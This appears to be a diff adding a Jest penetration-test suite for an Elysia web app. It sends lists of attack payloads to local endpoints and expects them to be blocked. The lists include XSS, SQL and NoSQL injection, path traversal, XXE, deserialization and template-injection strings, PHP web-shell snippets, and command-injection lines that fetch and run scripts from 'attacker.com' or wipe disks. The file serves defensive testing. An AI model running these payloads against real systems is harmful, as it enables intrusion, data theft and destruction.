@@ -1,0 +1,613 @@
+import { describe, expect, test, beforeAll, afterAll } from '@jest/globals';
+import { Elysia } from 'elysia';
+import { fullSecurityHeaders } from '../../middleware/securityHeaders.js';
+import { authSecurityMiddleware } from '../../middleware/strictSecurity.js';
+import { fullValidationPlugin } from '../../plugins/validationPlugin.js';
+import { SecurityLogger } from '../../services/securityLogger.js';
+
+describe('Penetration Testing Suite', () => {
+  let app: Elysia;
+
+  beforeAll(async () => {
+    // Setup test application with full security stack
+    app = new Elysia()
+      .use(fullSecurityHeaders())
+      .use(authSecurityMiddleware())
+      .use(fullValidationPlugin({ detectMalicious: true, strictMode: true }))
+      .post('/auth/login', ({ body, validateBody }) => {
+        const schema = { parse: (data: any) => data };
+        const validatedBody = validateBody(schema, body);
+        return { success: true, token: 'fake-jwt-token' };
+      })
+      .post('/api/users', ({ body, validateBody }) => {
+        const schema = { parse: (data: any) => data };
+        const validatedBody = validateBody(schema, body);
+        return { success: true, user: validatedBody };
+      })
+      .get('/api/admin/users', () => {
+        return { success: true, users: [] };
+      });
+  });
+
+  describe('XSS (Cross-Site Scripting) Attack Tests', () => {
+    const xssPayloads = [
+      // Basic XSS
+      '<script>alert("xss")</script>',
+      '<SCRIPT>alert("XSS")</SCRIPT>',
+      
+      // Event-based XSS
+      '<img src=x onerror=alert("xss")>',
+      '<svg onload=alert("xss")>',
+      '<iframe src="javascript:alert(\'xss\')"></iframe>',
+      '<body onload=alert("xss")>',
+      '<input autofocus onfocus=alert("xss")>',
+      
+      // Attribute-based XSS
+      '" onclick="alert(\'xss\')"',
+      '\'" onclick="alert(\'xss\')"',
+      'javascript:alert("xss")',
+      
+      // Encoded XSS
+      '%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E',
+      '&#60;script&#62;alert(&#34;xss&#34;)&#60;/script&#62;',
+      
+      // CSS-based XSS
+      '<style>@import"javascript:alert(\'xss\')"</style>',
+      '<link rel=stylesheet href="javascript:alert(\'xss\')">',
+      
+      // Advanced XSS
+      '<object data="data:text/html,<script>alert(\'xss\')</script>"></object>',
+      '<embed src="data:text/html,<script>alert(\'xss\')</script>">',
+      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
+      
+      // Filter bypass attempts
+      '<scr<script>ipt>alert("xss")</scr</script>ipt>',
+      '<svg><animatetransform onbegin=alert("xss")>',
+      '<math><mi//xlink:href="data:x,<script>alert(\'xss\')</script>">',
+    ];
+
+    test('should block all XSS attack vectors', async () => {
+      for (const payload of xssPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: 'Test User',
+            bio: payload,
+            comment: payload
+          })
+        }));
+
+        // Should either block (400) or sanitize the content
+        if (response.status === 200) {
+          const result = await response.json();
+          expect(result.user?.bio || '').not.toContain('<script');
+          expect(result.user?.comment || '').not.toContain('javascript:');
+          expect(result.user?.bio || '').not.toContain('onerror');
+        } else {
+          expect(response.status).toBe(400);
+        }
+      }
+    });
+  });
+
+  describe('SQL Injection Attack Tests', () => {
+    const sqlInjectionPayloads = [
+      // Classic SQL injection
+      "' OR '1'='1",
+      "' OR 1=1 --",
+      "' OR '1'='1' /*",
+      "'; DROP TABLE users; --",
+      "' UNION SELECT NULL --",
+      
+      // Blind SQL injection
+      "' AND (SELECT COUNT(*) FROM users) > 0 --",
+      "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
+      
+      // Time-based blind SQL injection
+      "'; WAITFOR DELAY '00:00:05' --",
+      "' OR (SELECT SLEEP(5)) --",
+      
+      // Union-based injection
+      "' UNION SELECT username, password FROM users --",
+      "' UNION ALL SELECT NULL, NULL, NULL --",
+      
+      // Boolean-based blind injection
+      "' OR 1=1 AND '1'='1",
+      "' OR 1=2 AND '1'='1",
+      
+      // Error-based injection
+      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
+      "' OR (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
+      
+      // Second-order injection
+      "admin'/*",
+      "admin';--",
+      
+      // Advanced payloads
+      "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
+      "1' AND ROW(1,1)>(SELECT COUNT(*), CONCAT(CHAR(95,33,64,52,115,97,116,117,114,110,95,33,64,52),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1) --"
+    ];
+
+    test('should block all SQL injection attempts', async () => {
+      for (const payload of sqlInjectionPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: payload,
+            email: `test${payload}@example.com`,
+            search: payload
+          })
+        }));
+
+        // Should block malicious SQL content
+        expect(response.status).toBe(400);
+        
+        if (response.status !== 400) {
+          const result = await response.json();
+          // Ensure no SQL keywords pass through
+          const userData = JSON.stringify(result.user || {}).toLowerCase();
+          expect(userData).not.toContain('union');
+          expect(userData).not.toContain('select');
+          expect(userData).not.toContain('drop');
+          expect(userData).not.toContain('insert');
+          expect(userData).not.toContain('delete');
+        }
+      }
+    });
+  });
+
+  describe('Path Traversal Attack Tests', () => {
+    const pathTraversalPayloads = [
+      // Basic path traversal
+      '../../../etc/passwd',
+      '..\\..\\..\\windows\\system32\\config\\sam',
+      
+      // URL encoded
+      '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
+      '%2e%2e\\%2e%2e\\%2e%2e\\',
+      
+      // Double encoded
+      '%252e%252e%252f%252e%252e%252f%252e%252e%252f',
+      
+      // Unicode encoded
+      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
+      '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
+      
+      // Mixed techniques
+      '....//....//....//etc//passwd',
+      '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam',
+      
+      // Null byte injection
+      '../../../etc/passwd%00',
+      '../../../etc/passwd\x00',
+      
+      // Filter bypass
+      '..././..././..././etc/passwd',
+      '.\\../.\\../.\\../etc/passwd',
+      
+      // Absolute paths
+      '/etc/passwd',
+      '\\windows\\system32\\config\\sam',
+      'C:\\windows\\system32\\config\\sam',
+      
+      // Protocol manipulation
+      'file:///etc/passwd',
+      'file://C:\\windows\\system32\\config\\sam'
+    ];
+
+    test('should block all path traversal attempts', async () => {
+      for (const payload of pathTraversalPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            filename: payload,
+            path: payload,
+            avatar: payload
+          })
+        }));
+
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('Command Injection Attack Tests', () => {
+    const commandInjectionPayloads = [
+      // Basic command injection
+      '; ls -la',
+      '| cat /etc/passwd',
+      '& dir',
+      '&& whoami',
+      
+      // Backticks
+      '`whoami`',
+      '`cat /etc/passwd`',
+      
+      // Subshell
+      '$(whoami)',
+      '$(cat /etc/passwd)',
+      
+      // Pipe commands
+      '| nc -l -p 12345',
+      '| telnet attacker.com 4444',
+      
+      // Chained commands
+      '; curl http://attacker.com/shell.sh | sh',
+      '&& wget http://attacker.com/backdoor.exe',
+      
+      // Environment variables
+      '; echo $PATH',
+      '; printenv',
+      
+      // File operations
+      '; rm -rf /',
+      '; dd if=/dev/zero of=/dev/sda',
+      
+      // Network operations
+      '; nmap -sS localhost',
+      '; wget http://malicious-site.com/payload.sh'
+    ];
+
+    test('should block all command injection attempts', async () => {
+      for (const payload of commandInjectionPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            command: payload,
+            filename: `file${payload}.txt`,
+            description: `Description ${payload}`
+          })
+        }));
+
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('NoSQL Injection Attack Tests', () => {
+    const noSqlPayloads = [
+      // MongoDB injection
+      '{"$ne": null}',
+      '{"$regex": ".*"}',
+      '{"$where": "function() { return true; }"}',
+      '{"$gt": ""}',
+      
+      // JavaScript injection in NoSQL
+      '\'; return true; var x = \'',
+      'true; while(true){}; return true',
+      
+      // Boolean bypass
+      '{"$or": [{"username": "admin"}, {"username": {"$ne": "admin"}}]}',
+      
+      // Regex injection
+      '{"username": {"$regex": "^adm"}}',
+      '{"password": {"$regex": ".*"}}',
+      
+      // Array injection
+      '{"username": ["admin", "user"]}',
+      '{"password": {"$in": ["", null, true, false]}}'
+    ];
+
+    test('should block NoSQL injection attempts', async () => {
+      for (const payload of noSqlPayloads) {
+        const response = await app.handle(new Request('http://localhost/auth/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: payload,
+            password: payload
+          })
+        }));
+
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('Header Injection Attack Tests', () => {
+    const headerInjectionPayloads = [
+      'test\r\nX-Injected-Header: malicious',
+      'test\nSet-Cookie: admin=true',
+      'test%0d%0aX-Forwarded-For: attacker.com',
+      'test%0aLocation: http://evil.com',
+      'test\r\n\r\n<script>alert("xss")</script>',
+    ];
+
+    test('should prevent header injection attacks', async () => {
+      for (const payload of headerInjectionPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'X-Custom-Header': payload,
+            'User-Agent': payload
+          },
+          body: JSON.stringify({
+            name: 'Test User',
+            referrer: payload
+          })
+        }));
+
+        // Should not reflect the malicious headers
+        expect(response.headers.get('X-Injected-Header')).toBeNull();
+        expect(response.headers.get('Set-Cookie')).not.toContain('admin=true');
+      }
+    });
+  });
+
+  describe('LDAP Injection Attack Tests', () => {
+    const ldapPayloads = [
+      '*)(uid=*))(|(uid=*',
+      '*)|(mail=*',
+      '*)|(cn=*',
+      '*)(&(objectClass=*',
+      '*))%00',
+      '*()|%26',
+      '*)(objectClass=*)(|(objectClass=*'
+    ];
+
+    test('should block LDAP injection attempts', async () => {
+      for (const payload of ldapPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: payload,
+            filter: payload,
+            search: payload
+          })
+        }));
+
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('XML/XXE Attack Tests', () => {
+    const xxePayloads = [
+      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
+      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>',
+      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+    ];
+
+    test('should block XXE attacks', async () => {
+      for (const payload of xxePayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/xml' },
+          body: payload
+        }));
+
+        // Should not process XML or should block it
+        expect(response.status).not.toBe(200);
+      }
+    });
+  });
+
+  describe('Deserialization Attack Tests', () => {
+    const deserializationPayloads = [
+      // Java deserialization
+      'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABc3IAEGphdmEubGFuZy5TdHJpbmc',
+      
+      // Python pickle
+      'csubprocess\nsystem\n(S\'cat /etc/passwd\'\ntR.',
+      
+      // PHP serialization
+      'O:8:"stdClass":1:{s:4:"test";s:26:"system(\'cat /etc/passwd\');";}',
+      
+      // .NET serialization
+      '<ObjectDataProvider MethodName="Start" IsInitialLoadEnabled="False" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:sd="clr-namespace:System.Diagnostics;assembly=system" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">',
+    ];
+
+    test('should block deserialization attacks', async () => {
+      for (const payload of deserializationPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            data: payload,
+            serialized: payload
+          })
+        }));
+
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('Server-Side Template Injection (SSTI) Tests', () => {
+    const sstiPayloads = [
+      // Jinja2
+      '{{7*7}}',
+      '{{config}}',
+      '{{request}}',
+      
+      // Twig
+      '{{7*7}}',
+      '{{_self}}',
+      
+      // Smarty
+      '{$smarty.version}',
+      '{php}echo `whoami`;{/php}',
+      
+      // Freemarker
+      '${7*7}',
+      '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }',
+      
+      // Velocity
+      '#set($ex=$rt.getRuntime().exec("whoami"))',
+      '$ex.waitFor()',
+      
+      // Thymeleaf
+      '__${7*7}__::.x',
+      '__${T(java.lang.Runtime).getRuntime().exec("whoami")}__::.x'
+    ];
+
+    test('should block SSTI attacks', async () => {
+      for (const payload of sstiPayloads) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            template: payload,
+            message: payload,
+            content: payload
+          })
+        }));
+
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('File Upload Attack Tests', () => {
+    test('should reject malicious file types', async () => {
+      const maliciousFiles = [
+        { name: 'shell.php', type: 'application/x-php' },
+        { name: 'backdoor.jsp', type: 'application/x-jsp' },
+        { name: 'malware.exe', type: 'application/x-executable' },
+        { name: 'script.js', type: 'application/javascript' },
+        { name: 'payload.asp', type: 'application/x-asp' },
+        { name: 'virus.bat', type: 'application/x-bat' },
+        { name: 'trojan.scr', type: 'application/x-msdownload' }
+      ];
+
+      for (const file of maliciousFiles) {
+        const formData = new FormData();
+        formData.append('file', new Blob(['malicious content'], { type: file.type }), file.name);
+        
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          body: formData
+        }));
+
+        // Should reject malicious files
+        expect(response.status).toBe(400);
+      }
+    });
+
+    test('should reject files with malicious content', async () => {
+      const maliciousContents = [
+        '<?php system($_GET["cmd"]); ?>',
+        '<script>alert("xss")</script>',
+        '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec("whoami"); %>',
+        'eval($_POST["code"]);'
+      ];
+
+      for (const content of maliciousContents) {
+        const formData = new FormData();
+        formData.append('file', new Blob([content], { type: 'text/plain' }), 'test.txt');
+        
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          body: formData
+        }));
+
+        // Should detect and reject malicious content
+        expect(response.status).toBe(400);
+      }
+    });
+  });
+
+  describe('Business Logic Attack Tests', () => {
+    test('should prevent parameter pollution', async () => {
+      const response = await app.handle(new Request('http://localhost/api/users?role=user&role=admin', {
+        method: 'GET'
+      }));
+
+      // Should handle parameter pollution gracefully
+      expect(response.status).toBeLessThan(500);
+    });
+
+    test('should prevent race condition exploits', async () => {
+      const requests = Array(10).fill(null).map(() => 
+        app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: 'racetest',
+            action: 'create_admin'
+          })
+        }))
+      );
+
+      const responses = await Promise.all(requests);
+      
+      // Should handle concurrent requests properly
+      responses.forEach(response => {
+        expect(response.status).toBeLessThan(500);
+      });
+    });
+
+    test('should prevent privilege escalation attempts', async () => {
+      const escalationAttempts = [
+        { role: 'admin', isAdmin: true },
+        { permissions: ['admin', 'superuser'] },
+        { user_type: 'administrator' },
+        { access_level: 'root' }
+      ];
+
+      for (const attempt of escalationAttempts) {
+        const response = await app.handle(new Request('http://localhost/api/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: 'Test User',
+            ...attempt
+          })
+        }));
+
+        // Should not allow privilege escalation
+        if (response.status === 200) {
+          const result = await response.json();
+          expect(result.user?.role).not.toBe('admin');
+          expect(result.user?.isAdmin).not.toBe(true);
+        }
+      }
+    });
+  });
+
+  describe('HTTP Method Override Attack Tests', () => {
+    test('should prevent HTTP method override attacks', async () => {
+      const overrideMethods = ['DELETE', 'PUT', 'PATCH'];
+      
+      for (const method of overrideMethods) {
+        const response = await app.handle(new Request('http://localhost/api/admin/users', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'X-HTTP-Method-Override': method
+          },
+          body: JSON.stringify({ action: 'delete_all' })
+        }));
+
+        // Should not allow method override to bypass security
+        expect(response.status).not.toBe(200);
+      }
+    });
+  });
+
+  describe('Response Splitting Attack Tests', () => {
+    test('should prevent response splitting attacks', async () => {
+      const splittingPayloads = [
+        'test%0d%0aSet-Cookie:%20admin=true',
+        'test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n',
+        'test%0aLocation:%20http://evil.com'
+      ];
+
+      for (const payload of splittingPayloads) {
+        const response = await app.handle(new Request(`http://localhost/api/users?redirect=${payload}`, {
+          method: 'GET'
+        }));
+
+        // Should not reflect malicious headers
+        expect(response.headers.get('Set-Cookie')).not.toContain('admin=true');
+        expect(response.headers.get('Location')).not.toContain('evil.com');
+      }
+    });
+  });
+});
